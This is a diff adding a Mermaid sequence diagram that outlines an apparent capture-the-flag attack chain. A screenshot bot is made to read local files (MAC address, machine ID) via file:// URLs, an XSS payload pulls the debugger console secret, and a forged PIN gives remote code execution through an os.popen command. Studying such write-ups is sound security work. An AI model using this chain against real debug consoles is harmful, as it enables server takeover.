@@ -1,0 +1,44 @@
+sequenceDiagram
+    participant A as Attacker
+    participant S as Server
+    participant B as Bot
+    participant I as Internal System
+
+    Note over A, I: Extract MAC address
+    A->>S: GET: /?title=mac&url=file:///sys/class/net/eth0/address 
+    S->>B: POST: /api/screenshot?url=file:///sys/class/net/eth0/address 
+    B->>I: GET: file:///sys/class/net/eth0/address
+    I-->>A: screenshot of MAC address
+
+    Note over A, I: Extract Machine ID
+    A->>S: GET: /?title=id&url=file:///etc/machine-id 
+    S->>B: POST: /api/screenshot?url=file:///etc/machine-id 
+    B->>I: GET: file:///etc/machine-id 
+    I-->>A: screenshot of Machine ID
+
+    Note over A: Generate PIN
+
+    Note over A, I: Real attack
+    A->>S: GET: /?title=anything&url=your_generated_payload
+    S->>B: POST /api/screenshot?url=your_generated_payload
+    B-->>S: GET /?title=<XSS_payload>&url=about:blank
+    
+    Note over S, B: Bot gets XSS, script runs
+    Note over S, B: Fetch /console to read SECRET from returned html content
+
+    B-->>S: GET http://127.0.0.1:1337/console
+    S-->>B: HTML 
+
+    Note over B: Extract SECRET from HTML content
+    Note over S,B: Submit PIN
+    B-->>S: GET http://127.0.0.1:1337/console?__debugger__=yes
+    B-->S: &cmd=pinauth&pin={PIN}&s={SECRET}
+    
+    Note over S,B: RCE
+    B-->>S: GET http://127.0.0.1:1337/console?__debugger__=yes
+    B-->S: &cmd={cmd}&frm=0&s={SECRET}
+
+    S->>I: Execute command: __import__('os').popen('/app/read_flag').read()
+    I-->>B: flag
+    Note over B: script write flag to the page
+    B-->>A: Bot capture page and send back to attacker
